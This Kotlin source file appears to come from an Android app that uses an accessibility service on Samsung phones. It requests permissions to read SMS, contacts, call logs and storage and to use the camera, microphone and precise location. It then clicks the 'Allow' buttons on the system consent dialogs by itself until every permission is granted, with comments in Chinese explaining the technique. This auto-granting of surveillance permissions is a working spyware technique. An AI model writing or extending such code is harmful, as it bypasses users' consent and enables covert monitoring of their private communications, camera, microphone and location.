package com.zaka.screenagent.flow.samsung

import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService

/**
 * 三星第一步：**运行时权限**
 *
 * 做法：让系统自己弹（service.requestRuntimePermissions()），
 *       我们只负责在弹窗里点「允许 / 仅在使用时允许 / Allow」，
 *       最后一个权限点完用 checkSelfPermission 核对。
 *
 * 与小米的区别：OneUI 用的是 AOSP 权限对话框（permission_allow_button），
 * 没有 MIUI 的「仅在使用时允许」二次确认和"危险页"。
 */
object Step1 {

    private const val TAG = "SS-Step1"

    private val required = arrayOf(
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.READ_PHONE_STATE,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.ACCESS_FINE_LOCATION
    )

    fun run(service: BoundaryAccessibilityService, onDone: (Boolean) -> Unit) {
        Log.d(TAG, "申请运行时权限")
        runCatching { service.requestRuntimePermissions() }

        var ticks = 0
        val tick = object : Runnable {
            override fun run() {
                ticks++
                if (allGranted(service)) {
                    Log.d(TAG, "全部已授予")
                    onDone(true)
                    return
                }
                val hit = SamsungNavigator.clickText(service, SamsungNavigator.allowTexts)
                if (hit != null) Log.d(TAG, "点了「$hit」")
                if (ticks >= 40) {                      // 约 60 秒
                    val ok = allGranted(service)
                    Log.w(TAG, "超时 granted=$ok")
                    onDone(ok)
                    return
                }
                SamsungNavigator.post(1_500L, this)
            }
        }
        SamsungNavigator.post(1_500L, tick)
    }

    private fun allGranted(ctx: Context): Boolean = required.all {
        ctx.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
    }
}
